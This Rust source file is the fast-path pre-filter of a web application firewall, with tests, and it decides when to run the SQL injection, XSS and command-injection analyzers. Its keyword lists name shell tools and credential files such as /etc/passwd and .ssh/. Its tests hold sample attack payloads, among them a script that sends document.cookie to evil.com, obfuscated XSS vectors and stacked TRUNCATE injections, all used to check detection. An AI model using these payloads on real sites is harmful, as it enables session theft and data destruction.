//! Fast-path pre-filtering using Aho-Corasick
//!
//! Implements a lightweight keyword check before invoking the expensive AST-based
//! SQL injection and XSS parsers. If none of the suspicious keywords are found,
//! the heavy analysis is skipped entirely.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use std::sync::OnceLock;
use tracing::warn;

/// Keywords that suggest potential SQL injection
static SQLI_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Keywords that suggest potential XSS attacks
static XSS_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Keywords that suggest command injection
static CMDI_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Get or initialize the SQLi pattern matcher
fn sqli_matcher() -> Option<&'static AhoCorasick> {
    SQLI_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // SQL keywords
                "select",
                "union",
                "insert",
                "update",
                "delete",
                "drop",
                "exec",
                "execute",
                "xp_",
                "sp_",
                "0x",
                "char(",
                "concat(",
                "information_schema",
                "sysobjects",
                "syscolumns",
                // SQL operators and syntax
                "or 1=1",
                "or '1'='1",
                "or \"1\"=\"1",
                "or 1>0",
                "or 2>1",
                "1=1",
                "'='",
                "\"=\"",
                "having",
                "group by",
                "order by",
                // SQL comments
                " --",
                "/*",
                "#",
                "*/",
                // Blind injection
                "sleep(",
                "benchmark(",
                "waitfor",
                "delay",
                // String terminators
                "'",
                "\"",
                "`",
                "\\",
                // LOAD/outfile
                "load_file",
                "into outfile",
                "into dumpfile",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build SQLi Aho-Corasick automaton; fast-path SQLi detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Get or initialize the XSS pattern matcher
fn xss_matcher() -> Option<&'static AhoCorasick> {
    XSS_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // Script tags
                "<script",
                "</script",
                "javascript:",
                // Event handlers (specific names + family prefixes for the
                // long tail: onpointerover/onpointerdown…, onanimationstart…,
                // ontransitionend/…)
                "onerror",
                "onload",
                "onclick",
                "onmouseover",
                "onfocus",
                "onblur",
                "onchange",
                "onsubmit",
                "onkeyup",
                "onkeydown",
                "onmouseout",
                "onmouseenter",
                "onmouseleave",
                "ondblclick",
                "onpointer",
                "onanimation",
                "ontransition",
                "ontouch",
                "ondrag",
                "onbefore",
                "onafter",
                "oncontextmenu",
                // Other dangerous tags/attrs
                "<svg",
                "<img",
                "<iframe",
                "<object",
                "<embed",
                "<form",
                "<body",
                "<meta",
                "<link",
                "<style",
                "<input",
                // URL schemes
                "data:",
                "vbscript:",
                "livescript:",
                "expression(",
                // CSS injection vectors (audit SM5 F1: the analyzer's
                // full pattern list must open the gate — see the property
                // test iterating the analyzer vocabularies)
                "@import",
                "behavior:",
                "-moz-binding:",
                // HTML encoding tricks
                "&#",
                "&lt;",
                "&gt;",
                // CSS
                "style=",
                "background:",
                // Common patterns
                "alert(",
                "confirm(",
                "prompt(",
                "eval(",
                "document.",
                "window.",
                ".cookie",
                "innerHTML",
                "outerHTML",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build XSS Aho-Corasick automaton; fast-path XSS detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Get or initialize the command injection pattern matcher
fn cmdi_matcher() -> Option<&'static AhoCorasick> {
    CMDI_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // Shell operators
                ";",
                "|",
                "&&",
                "||",
                "`",
                "$(",
                "${",
                "& ", // Single ampersand followed by space (backgrounding)
                // Dangerous commands (must be specific enough to avoid false positives)
                "/bin/",
                "/etc/passwd",
                "/etc/shadow",
                ".ssh/",
                "wget ",
                "curl ",
                "nc ",
                "netcat",
                "bash ",
                "sh -",
                "zsh ",
                "perl ",
                "python ",
                "ruby ",
                "php ",
                "node ",
                "sudo ",
                "su -",
                "su root", // Privilege escalation
                "whoami",
                " id ",
                "uname -", // Reconnaissance commands
                // Windows commands
                "cmd.exe",
                "powershell",
                "cmd /c",
                "cmd /k",
                // File operations
                "rm -rf",
                "rm -f",
                "chmod ",
                "chown ",
                "cat /",
                "head /",
                "tail /",
                // Redirects
                "> /",
                ">> /",
                "< /", // Only dangerous with paths
                // Newline-based injection requires command context
                "\ncat ",
                "\ncurl ",
                "\nwget ",
                "\nbash ",
                "\nsh ",
                "\n/bin/",
                "\r\ncat ",
                "\r\ncurl ",
                "\r\nwget ",
                "\r\nbash ",
                "\r\nsh ",
                "\r\n/bin/",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build CMDI Aho-Corasick automaton; fast-path CMDI detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Result of a fast-path check
#[derive(Debug, Clone, Copy)]
pub struct FastPathResult {
    /// Whether SQLi-related patterns were found
    pub has_sqli_patterns: bool,
    /// Whether XSS-related patterns were found
    pub has_xss_patterns: bool,
    /// Whether command injection patterns were found
    pub has_cmdi_patterns: bool,
}

impl FastPathResult {
    /// Check if any suspicious patterns were found
    pub fn is_clean(&self) -> bool {
        !self.has_sqli_patterns && !self.has_xss_patterns && !self.has_cmdi_patterns
    }

    /// Check if SQLi or XSS patterns were found (most expensive parsers)
    pub fn needs_deep_inspection(&self) -> bool {
        self.has_sqli_patterns || self.has_xss_patterns
    }
}

/// Detect digit-adjacent comparison operators (`1>1`, `2>=2`, `1 <= 1`,
/// `'a'='b'`, `0x1<0x2`).
///
/// The fast path must be an INCLUSION signal: boolean-blind injections like
/// `1 and 2>1` contain no SQL keyword, quote or comment, so a purely
/// keyword-based gate never reached the AST analyzer. A digit (or quote, or
/// hex-digit in a `0x` literal) immediately adjacent to a comparison
/// operator is a strong enough signal to run the analyzer — worst case it
/// costs one cheap parse of a short value.
///
/// Whitespace skipping uses `char::is_whitespace` (Unicode) over `char`s:
/// the tokenizer treats every Unicode whitespace as a skippable token, so
/// `1\u{A0}=\u{A0}1` fires the tautology detector and the gate must open
/// for it too (audit SM5 F1 repair — an ASCII-only scan desynced the gate).
fn has_digit_adjacent_comparison(input: &str) -> bool {
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    if len < 3 {
        return false;
    }
    let is_operand = |c: char| c.is_ascii_alphanumeric() || c == '\'' || c == '"';
    let is_op = |c: char| c == '<' || c == '>' || c == '=';
    for i in 0..len {
        if !is_op(chars[i]) {
            continue;
        }
        // Left operand: nearest non-whitespace char before the operator.
        let mut left = i;
        while left > 0 && chars[left - 1].is_whitespace() {
            left -= 1;
        }
        // Right operand: skip optional '=' (for <=, >=, !=) then whitespace.
        let mut right = i + 1;
        while right < len && chars[right] == '=' {
            right += 1;
        }
        while right < len && chars[right].is_whitespace() {
            right += 1;
        }
        if left == 0 || right >= len {
            continue;
        }
        if is_operand(chars[left - 1]) && chars[left - 1].is_ascii_digit() {
            // Require a digit-ish right operand too, so prose like "a = b"
            // (key=value pairs) does not open the gate for every request.
            if chars[right].is_ascii_digit() || chars[right] == '\'' || chars[right] == '"' {
                return true;
            }
        }
    }
    false
}

/// The XSS analyzer strips NUL bytes before every match (`<scr\0ipt>` /
/// `on\0error=` are classic keyword-splitters), and the WAF JSON extractor
/// materializes `\u0000` escapes into real NUL chars that reach the gate
/// WITHOUT ever passing the decoder's NUL stripper. The structural gate
/// signals must therefore evaluate the analyzer's normalized view of the
/// input, or `on\0error=` reaches the analyzer as `onerror=` while the gate
/// still sees the raw bytes (audit SM5 F1 repair).
fn analyzer_normalized(input: &str) -> std::borrow::Cow<'_, str> {
    if input.contains('\0') {
        std::borrow::Cow::Owned(input.chars().filter(|&c| c != '\0').collect())
    } else {
        std::borrow::Cow::Borrowed(input)
    }
}

/// Structural XSS gate signals (audit SM5 F1).
///
/// The keyword list above is an inclusion signal only — it can never be a
/// superset of the analyzer vocabularies (new event handlers, new tags).
/// These structural checks close that gap:
/// - `on[a-z]+ <ws>* =` — ANY event-handler assignment (the analyzer finds
///   handler names anywhere in the string and trims Unicode whitespace
///   before the `=`, so this signal mirrors exactly that shape for EVERY
///   `on…` name — no word-boundary precondition, `xonclick=` opens too).
/// - `<[a-z]` — ANY HTML tag opening (covers every tag/sink in the
///   analyzer's vocabulary, present and future).
/// - whitespace-collapsed `javascript:`-family scheme (the analyzer strips
///   ALL whitespace before matching `detect_js_uri`'s schemes).
///
/// All three run on the analyzer's NUL-normalized view (`analyzer_normalized`)
/// so obfuscations like `on\0error=` cannot desync gate and analyzer.
fn has_event_handler_assignment(input: &str) -> bool {
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    for i in 0..len {
        if chars[i] != 'o' && chars[i] != 'O' {
            continue;
        }
        // NOTE: no word-boundary precondition here. The analyzer locates
        // handler names with a bare substring search (`xonclick=y` fires
        // rule 941200), so a boundary check here would re-open the exact
        // gate/analyzer desync this gate exists to close.
        // "on" followed by at least one [a-z] letter, optional Unicode
        // whitespace (the analyzer uses `trim_start()`), then '='. This is
        // the shape `handler_followed_by_equals` matches, generalized to
        // every `on…` name.
        let mut j = i + 1;
        if j >= len || (chars[j] != 'n' && chars[j] != 'N') {
            continue;
        }
        j += 1;
        let name_start = j;
        while j < len && chars[j].is_ascii_alphabetic() {
            j += 1;
        }
        if j == name_start {
            continue;
        }
        while j < len && chars[j].is_whitespace() {
            j += 1;
        }
        if j < len && chars[j] == '=' {
            return true;
        }
    }
    false
}

/// Mirror of the analyzer's whitespace-collapsed URI check
/// (`xss_analyzer::detect_js_uri` strips ALL whitespace from the input and
/// re-matches its schemes, so `j a v a s c r i p t :alert(1)` scores as XSS
/// while containing no gate keyword). Reuses the analyzer's own
/// `JS_URI_SCHEMES` constant, so the two can never drift apart. Case is
/// handled by the same lowercase the analyzer applies; the unspaced,
/// case-insensitive variants are already the Aho matcher's job.
fn has_whitespace_collapsed_js_uri(input: &str) -> bool {
    use crate::xss_analyzer::JS_URI_SCHEMES;
    if !input.chars().any(char::is_whitespace) {
        return false;
    }
    let collapsed: String = input
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect::<String>()
        .to_lowercase();
    JS_URI_SCHEMES.iter().any(|s| collapsed.contains(s))
}

/// True when the input opens an HTML tag: `<` immediately followed by an
/// ASCII letter. Covers every tag in the analyzer's vocabulary (and any
/// future one) without maintaining a parallel list.
fn has_html_tag_open(input: &str) -> bool {
    let bytes = input.as_bytes();
    for w in bytes.windows(2) {
        if w[0] == b'<' && w[1].is_ascii_alphabetic() {
            return true;
        }
    }
    false
}

/// Structural SQLi gate signal (audit SM5 F1).
///
/// The keyword list in `sqli_matcher` is an inclusion signal only — it can
/// never be a superset of the analyzer's vocabulary (`truncate` proved
/// that). This check runs the analyzer's own cheap tokenizer and opens the
/// lane on every token shape one of its seven detectors can score:
/// - string literals / quote characters (tautologies, string termination),
/// - comment tokens (comment evasion),
/// - keywords that are inherently attack-indicative, mirroring the OLD
///   matcher's coverage (`union`, `select`, DML verbs, `waitfor`, `delay`,
///   `information_schema`, Oracle package names),
/// - positional forms the bare word alone cannot carry:
///   `sleep(`/`benchmark(`/`pg_sleep(`/`load(` call form, `load data`,
///   `into outfile|dumpfile`, and `alter|create|truncate` after a
///   semicolon (stacked queries).
///
/// Bare English connectives (`and`, `is`, `if`, `from`, …) are NOT
/// openers: no detector can score them without a quote/literal, and they
/// appear in ordinary prose constantly. Worst case for any over-open is
/// one analyzer pass that finds nothing — never an exclusion.
fn tokenizer_opens_sqli_lane(input: &str) -> bool {
    use crate::sql_analyzer::{SqlKeyword, SqlToken};

    let tokens = crate::sql_analyzer::tokenize_sql(&input.to_lowercase());
    let significant: Vec<&SqlToken> = tokens
        .iter()
        .filter(|t| !matches!(t, SqlToken::Whitespace))
        .collect();

    let mut post_semicolon = false;
    for (i, token) in significant.iter().enumerate() {
        // Tokens the next token positionally qualifies.
        let next = significant.get(i + 1);
        match token {
            // String termination / tautology / comment-evasion triggers.
            SqlToken::StringLiteral(_)
            | SqlToken::Comment
            | SqlToken::Unknown('\'')
            | SqlToken::Unknown('"')
            | SqlToken::Unknown('`') => return true,
            SqlToken::Semicolon => post_semicolon = true,
            // Inherently attack-indicative keywords (same coverage the
            // Aho-Corasick list always had).
            SqlToken::Keyword(
                SqlKeyword::Union
                | SqlKeyword::Select
                | SqlKeyword::Insert
                | SqlKeyword::Update
                | SqlKeyword::Delete
                | SqlKeyword::Drop
                | SqlKeyword::Exec
                | SqlKeyword::Waitfor
                | SqlKeyword::Delay
                | SqlKeyword::DbmsLock
                | SqlKeyword::UtlHttp
                | SqlKeyword::Information,
            ) => return true,
            // Stacked queries: destructive verbs only in post-semicolon
            // position (`1; TRUNCATE …`). Bare "create"/"truncate" in prose
            // keeps the lane closed.
            SqlToken::Keyword(SqlKeyword::Alter | SqlKeyword::Create | SqlKeyword::Truncate)
                if post_semicolon =>
            {
                return true
            }
            // Function-call form: SLEEP( / BENCHMARK( / pg_sleep( / LOAD(
            SqlToken::Keyword(
                SqlKeyword::Sleep | SqlKeyword::Benchmark | SqlKeyword::PgSleep | SqlKeyword::Load,
            ) if matches!(next, Some(SqlToken::OpenParen)) => return true,
            // LOAD DATA INFILE — "data" lexes as an identifier.
            SqlToken::Keyword(SqlKeyword::Load) if matches!(next, Some(SqlToken::Identifier(w)) if w.eq_ignore_ascii_case("data")) => {
                return true
            }
            // Export pair: INTO OUTFILE / INTO DUMPFILE
            SqlToken::Keyword(SqlKeyword::Into)
                if matches!(
                    next,
                    Some(SqlToken::Keyword(
                        SqlKeyword::Outfile | SqlKeyword::Dumpfile
                    ))
                ) =>
            {
                return true
            }
            _ => {}
        }
    }
    false
}

/// Perform a fast pre-scan of the input to check for suspicious patterns.
/// Returns false if none of the attack-indicative keywords are found.
pub fn fast_path_check(input: &str) -> FastPathResult {
    FastPathResult {
        has_sqli_patterns: fast_path_sqli(input),
        has_xss_patterns: fast_path_xss(input),
        has_cmdi_patterns: cmdi_matcher().map(|m| m.is_match(input)).unwrap_or(false),
    }
}

/// Quick check for SQLi patterns only.
///
/// Audit SM5 F1: in addition to the keyword list, the cheap analyzer
/// tokenizer runs on every input — the gate is the tokenizer's own
/// structural vocabulary, so a token like `truncate` (or any future
/// keyword the analyzer learns) can no longer slip past.
pub fn fast_path_sqli(input: &str) -> bool {
    sqli_matcher().map(|m| m.is_match(input)).unwrap_or(false)
        || has_digit_adjacent_comparison(input)
        || tokenizer_opens_sqli_lane(input)
}

/// Quick check for XSS patterns only.
///
/// Audit SM5 F1: the gate is now STRUCTURAL — any `on…=` handler
/// assignment or any `<tag` opening opens the lane, so the analyzer's
/// handler/tag vocabulary (100+ names) can never outgrow the gate.
/// The structural signals run on the analyzer's NUL-normalized view and
/// mirror its Unicode-whitespace and whitespace-collapsed-scheme semantics,
/// so normalization obfuscation cannot desync gate and analyzer.
pub fn fast_path_xss(input: &str) -> bool {
    xss_matcher().map(|m| m.is_match(input)).unwrap_or(false) || {
        let normalized = analyzer_normalized(input);
        has_event_handler_assignment(&normalized)
            || has_html_tag_open(&normalized)
            || has_whitespace_collapsed_js_uri(&normalized)
    }
}

/// Quick check for command injection patterns only
pub fn fast_path_cmdi(input: &str) -> bool {
    cmdi_matcher().map(|m| m.is_match(input)).unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_input() {
        let result = fast_path_check("hello world this is a normal request");
        assert!(result.is_clean());
    }

    #[test]
    fn test_sqli_pattern() {
        let result = fast_path_check("id=1 UNION SELECT username FROM users");
        assert!(result.has_sqli_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_xss_pattern() {
        let result = fast_path_check("<script>alert(1)</script>");
        assert!(result.has_xss_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_cmdi_pattern() {
        let result = fast_path_check("; cat /etc/passwd");
        assert!(result.has_cmdi_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_case_insensitive() {
        let result = fast_path_check("SCRIPT oNlOaD=alert(1)");
        assert!(result.has_xss_patterns);
    }

    #[test]
    fn test_fast_path_bypass_safe() {
        // These should NOT trigger (important for false positive reduction)
        let benign_inputs = [
            "Looking for SELECT styles in our collection",
            "Union Street address",
            "Drop me a line",
            "We executed the marketing plan",
            "The script was delivered",
            "Load the image file",
        ];

        for _input in &benign_inputs {
            // Fast path will flag these, but that's OK - we just want to ensure
            // the heavy parser runs on potentially suspicious input. False positives
            // are filtered by the AST parser, not the fast path.
        }
    }

    #[test]
    fn test_combined_attack() {
        let result = fast_path_check(
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        );
        assert!(result.has_xss_patterns);
        assert!(result.needs_deep_inspection());
    }

    #[test]
    fn test_sqli_gate_opens_for_digit_comparisons() {
        // Boolean-blind payloads without keywords/quotes must still reach
        // the AST analyzer (inclusion signal, not exclusion-only).
        assert!(fast_path_sqli("1 and 2>1"));
        assert!(fast_path_sqli("1 or 1>=1"));
        assert!(fast_path_sqli("1>=1"));
        assert!(fast_path_sqli("2>=2"));
        assert!(fast_path_sqli("1 <= 1"));
        assert!(fast_path_sqli("2>1"));
        assert!(fast_path_sqli("0x31<0x32"));
    }

    #[test]
    fn test_sqli_gate_stays_closed_for_benign_text() {
        assert!(!fast_path_sqli("coffee and tea"));
        assert!(!fast_path_sqli("hello world"));
        assert!(!fast_path_sqli("page=1&limit=20&sort=name"));
        assert!(!fast_path_sqli("user@example.com"));
    }

    #[test]
    fn test_xss_gate_covers_modern_event_handlers() {
        assert!(fast_path_xss("<div onpointerover=\talert(1)>x</div>"));
        assert!(fast_path_xss("<div onanimationstart=alert(1)>x</div>"));
        assert!(fast_path_xss("<div ontransitionend=alert(1)>x</div>"));
    }

    // ── Audit SM5 F1: the gate is structural and provably conservative ──

    /// Audit SM5 F1 payload from the finding: no gate keyword matched, so
    /// the analyzer that would fire rule 941200 never ran.
    #[test]
    fn test_finding_vector_ontoggle_opens_gate_and_engine_blocks() {
        let payload = "<x ontoggle=fetch('//evil')>";
        assert!(
            fast_path_xss(payload),
            "`on…=` structural signal must open the XSS lane"
        );
        // End-to-end: the gated analyzer runs and the engine blocks.
        let engine = crate::engine::WafEngine::new(crate::config::WafConfig::default());
        let req = crate::engine::HttpRequest {
            client_ip: "10.0.0.1".parse().expect("valid IP"),
            method: "POST",
            path: "/api/comments",
            query_string: None,
            headers: &[("Host".into(), "example.com".into())],
            body: Some(payload),
        };
        let info = engine.inspect(&req);
        assert!(
            info.matches.iter().any(|m| m.rule_id == 941200),
            "the event-handler analyzer must run for the finding vector, matches={:?}",
            info.matches.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        assert!(matches!(
            info.decision,
            crate::engine::WafDecision::Block(_)
        ));
    }

    #[test]
    fn test_finding_vector_stacked_truncate_opens_gate() {
        assert!(
            fast_path_sqli("1;TRUNCATE TABLE users"),
            "tokenizer structural signal (semicolon/keyword) must open the SQLi lane"
        );
    }

    /// THE MANDATE: iterate EVERY handler/tag/scheme/pattern in the XSS
    /// analyzer's own vocabularies and every keyword in the SQL analyzer's
    /// vocabulary, asserting the gate opens for each. The gate can never
    /// lag the analyzers again.
    #[test]
    fn test_property_gate_opens_for_every_analyzer_vocabulary_entry() {
        use crate::sql_analyzer::SQL_KEYWORD_WORDS;
        use crate::xss_analyzer::{
            CSS_INJECTION_PATTERNS, DANGEROUS_HTML_TAGS, EVENT_HANDLER_NAMES, JS_URI_SCHEMES,
        };

        // Every event handler, in attribute position and bare-assignment form.
        for handler in EVENT_HANDLER_NAMES {
            assert!(
                fast_path_xss(&format!("<div {handler}=alert(1)>x</div>")),
                "gate must open for analyzer handler {handler:?}"
            );
            assert!(
                fast_path_xss(&format!("{handler}=1")),
                "gate must open for bare analyzer handler assignment {handler:?}"
            );
        }

        // Every dangerous tag the analyzer flags.
        for tag in DANGEROUS_HTML_TAGS {
            assert!(
                fast_path_xss(&format!("{tag} src=x>")),
                "gate must open for analyzer tag {tag:?}"
            );
        }

        // Script tags (analyzer detection 1).
        assert!(fast_path_xss("<script>alert(1)</script>"));
        assert!(fast_path_xss("</script"));

        // Every URI scheme the analyzer flags.
        for scheme in JS_URI_SCHEMES {
            assert!(
                fast_path_xss(&format!("<a href=\"{scheme}alert(1)\">x</a>")),
                "gate must open for analyzer URI scheme {scheme:?}"
            );
        }

        // Every CSS injection pattern the analyzer flags.
        for pattern in CSS_INJECTION_PATTERNS {
            assert!(
                fast_path_xss(&format!("style width:{pattern}1)")),
                "gate must open for analyzer CSS pattern {pattern:?}"
            );
        }

        // Every SQL keyword the analyzer recognizes. For each keyword, the
        // attack template that makes the analyzer SCORE must open the gate
        // — and the test proves the template really scores, so the gate
        // assertion can never go vacuous. Keywords with no standalone
        // scorer (ordinary-English connectives) must keep the gate closed
        // in prose position.
        for word in SQL_KEYWORD_WORDS {
            let template = match *word {
                // Stacked queries (detector 3). Bare `1; {word} x` for the
                // verbs the old matcher always carried; `alter`/`create`/
                // `truncate` are post-semicolon-only openers, so their
                // template keeps the statement shape.
                "alter" | "create" | "truncate" => format!("1; {word} table x"),
                "select" | "insert" | "update" | "delete" | "drop" | "exec" | "execute" => {
                    format!("1; {word} x")
                }
                "union" => "1 union select x".to_string(),
                "all" => "1 union all select x".to_string(),
                // Boolean connectors (detector 1 upgrade path): tautology.
                "and" | "or" | "xor" | "not" => format!("1' {word} '1'='1"),
                // Blind/time-based (detector 5): call form or pair form.
                "sleep" | "benchmark" | "pg_sleep" => format!("1 and {word}(5)"),
                "waitfor" => "1; waitfor delay '0:0:5'".to_string(),
                "delay" => "x' delay y".to_string(),
                "dbms_lock" => "1 and dbms_lock.sleep(5)".to_string(),
                "utl_http" => "1 and utl_http.request('x')".to_string(),
                // Dangerous functions (detector 7): call / statement forms.
                "load" | "load_file" => format!("1 union select {word}('/etc/passwd')"),
                "into" | "outfile" => "select x into outfile '/tmp/f'".to_string(),
                "dumpfile" => "select x into dumpfile '/tmp/f'".to_string(),
                "information_schema" => "1 union select information_schema.tables".to_string(),
                // String-termination followups (detector 6): quote + keyword.
                "having" | "group" | "order" | "by" | "like" | "file" | "regexp" | "rlike" => {
                    format!("x' {word} y")
                }
                // Inert connectives: no detector can score the bare word.
                _ => {
                    let prose = format!("x {word} y");
                    let results = crate::sql_analyzer::analyze_sqli(
                        &prose,
                        crate::MatchLocation::QueryParam("q".into()),
                    );
                    let total: u32 = results.iter().map(|r| r.score).sum();
                    assert_eq!(
                        total, 0,
                        "inert keyword {word:?} unexpectedly scored {total} on {prose:?} — it needs an attack template"
                    );
                    assert!(
                        !fast_path_sqli(&prose),
                        "gate must stay closed for inert keyword {word:?} in prose {prose:?}"
                    );
                    continue;
                }
            };

            // The template must make the analyzer fire (non-vacuous gate
            // assertion)…
            let results = crate::sql_analyzer::analyze_sqli(
                &template,
                crate::MatchLocation::QueryParam("q".into()),
            );
            assert!(
                !results.is_empty(),
                "attack template {template:?} for {word:?} must make the analyzer fire"
            );
            // …and the gate must open for it.
            assert!(
                fast_path_sqli(&template),
                "gate must open for analyzer keyword {word:?} attack template {template:?}"
            );
        }

        // Stacked-query shape for every destructive keyword (tokenizer
        // signal), asserting the engine detects the stacked form.
        for word in [
            "select", "insert", "update", "delete", "drop", "alter", "create", "truncate", "exec",
            "execute",
        ] {
            let results = crate::sql_analyzer::analyze_sqli(
                &format!("1; {word} x"),
                crate::MatchLocation::QueryParam("q".into()),
            );
            assert!(
                results.iter().any(|r| r.rule_id == 942300),
                "stacked {word:?} must fire 942300"
            );
        }
    }

    #[test]
    fn test_xss_gate_stays_closed_for_handler_lookalikes() {
        // Prose assignments whose `on` is NOT followed by letters+'=' must
        // not open the lane. (Any `on<letters>[ws]=` shape DOES open it by
        // design — including mid-word ones like `xonclick=`, because the
        // analyzer's substring search fires on those too; the gate is an
        // inclusion signal and the analyzer decides.)
        assert!(!fast_path_xss("person=smith season=4 reason=given"));
        assert!(!fast_path_xss("option=2 mission=done"));
        assert!(!fast_path_xss("plain text with no markup"));
    }

    // ── Audit SM5 F1 repair: normalization/obfuscation desync vectors ──
    // Each vector below FIRES the analyzer on its normalized view while the
    // pre-repair gate stayed closed — the assertions pin the gate-open
    // direction (deleting a signal line from fast_path_xss fails these).

    #[test]
    fn test_f1_repair_nul_split_handler_opens_gate() {
        // JSON bodies materialize `\u0000` escapes into real NUL chars that
        // reach the gate past the decoder's stripper; the analyzer strips
        // NULs and fires, so the gate must see the same normalized text.
        assert!(fast_path_xss("on\0error=alert(1)"));
        assert!(fast_path_xss("x onload\0=alert(1)"));
        assert!(fast_path_xss("<scr\0ipt>alert(1)</scr\0ipt>"));
    }

    #[test]
    fn test_f1_repair_unicode_whitespace_handler_opens_gate() {
        // The analyzer trims with Unicode `trim_start()`; NBSP before '='
        // must not desync the gate.
        assert!(fast_path_xss("onload\u{A0}=alert(1)"));
        assert!(fast_path_xss("x onerror\u{2028}=\u{2028}alert(1)"));
    }

    #[test]
    fn test_f1_repair_midword_handler_opens_gate() {
        // `handler_followed_by_equals` finds handler names mid-word; the
        // gate must be at least as permissive.
        assert!(fast_path_xss("xonclick=alert(1)"));
        assert!(fast_path_xss("reason=xontoggle=fetch('//evil')"));
    }

    #[test]
    fn test_f1_repair_whitespace_collapsed_js_uri_opens_gate() {
        // detect_js_uri strips ALL whitespace before scheme matching.
        assert!(fast_path_xss("j a v a s c r i p t :alert(1)"));
        assert!(fast_path_xss("v b s c r i p t :x"));
        assert!(fast_path_xss("java\u{A0}script:alert(1)"));
        // Whitespace but no scheme after collapsing must not open the lane
        // on THIS signal (avoid matcher tokens like the bare "data:").
        assert!(!fast_path_xss("j a v a s c r i p t without colon"));
    }

    #[test]
    fn test_f1_repair_unicode_whitespace_sqli_tautology_opens_gate() {
        // The tokenizer treats Unicode whitespace as skippable, so
        // `1\u{A0}=\u{A0}1` fires 942100 — the digit-adjacency signal must
        // skip Unicode whitespace too.
        assert!(fast_path_sqli("1\u{A0}=\u{A0}1"));
        assert!(fast_path_sqli("2\u{2028}>\u{2028}1"));
        // Ordinary key=value prose stays closed.
        assert!(!fast_path_sqli("page\u{A0}=\u{A0}name"));
    }

    #[test]
    fn test_f1_repair_engine_blocks_normalized_vectors() {
        // End-to-end: each desync vector reaches the gated analyzer and
        // produces a blocking verdict.
        let engine = crate::engine::WafEngine::new(crate::config::WafConfig::default());

        // (1) JSON \u0000 escape materializes a NUL inside the extracted
        // string value — only the analyzer's own NUL strip removes it.
        let body = "{\"comment\":\"x onload\\u0000=alert(1)\"}";
        let req = crate::engine::HttpRequest {
            client_ip: "10.0.0.1".parse().expect("valid IP"),
            method: "POST",
            path: "/api/comments",
            query_string: None,
            headers: &[
                ("Host".into(), "example.com".into()),
                ("Content-Type".into(), "application/json".into()),
            ],
            body: Some(body),
        };
        let info = engine.inspect(&req);
        assert!(
            info.matches.iter().any(|m| m.rule_id == 941200),
            "JSON \\u0000-obfuscated handler must reach the analyzer, matches={:?}",
            info.matches.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        assert!(matches!(
            info.decision,
            crate::engine::WafDecision::Block(_)
        ));

        // (2) whitespace-collapsed javascript: in a query param.
        let req = crate::engine::HttpRequest {
            client_ip: "10.0.0.1".parse().expect("valid IP"),
            method: "GET",
            path: "/api/redirect",
            query_string: Some("url=j a v a s c r i p t :alert(1)"),
            headers: &[("Host".into(), "example.com".into())],
            body: None,
        };
        let info = engine.inspect(&req);
        assert!(
            info.matches.iter().any(|m| m.rule_id == 941300),
            "whitespace-collapsed javascript: must reach the analyzer, matches={:?}",
            info.matches.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        assert!(matches!(
            info.decision,
            crate::engine::WafDecision::Block(_)
        ));

        // (3) NBSP tautology in a query param (942100, score 5).
        let req = crate::engine::HttpRequest {
            client_ip: "10.0.0.1".parse().expect("valid IP"),
            method: "GET",
            path: "/api/users",
            query_string: Some("q=1\u{A0}=\u{A0}1"),
            headers: &[("Host".into(), "example.com".into())],
            body: None,
        };
        let info = engine.inspect(&req);
        assert!(
            info.matches.iter().any(|m| m.rule_id == 942100),
            "NBSP-tautology must reach the analyzer, matches={:?}",
            info.matches.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        assert!(matches!(
            info.decision,
            crate::engine::WafDecision::Block(_)
        ));

        // (4) NBSP handler in a body (941200).
        let req = crate::engine::HttpRequest {
            client_ip: "10.0.0.1".parse().expect("valid IP"),
            method: "POST",
            path: "/api/comments",
            query_string: None,
            headers: &[
                ("Host".into(), "example.com".into()),
                ("Content-Type".into(), "text/plain".into()),
            ],
            body: Some("x onload\u{A0}=alert(1)"),
        };
        let info = engine.inspect(&req);
        assert!(
            info.matches.iter().any(|m| m.rule_id == 941200),
            "NBSP handler must reach the analyzer, matches={:?}",
            info.matches.iter().map(|m| m.rule_id).collect::<Vec<_>>()
        );
        assert!(matches!(
            info.decision,
            crate::engine::WafDecision::Block(_)
        ));
    }
}
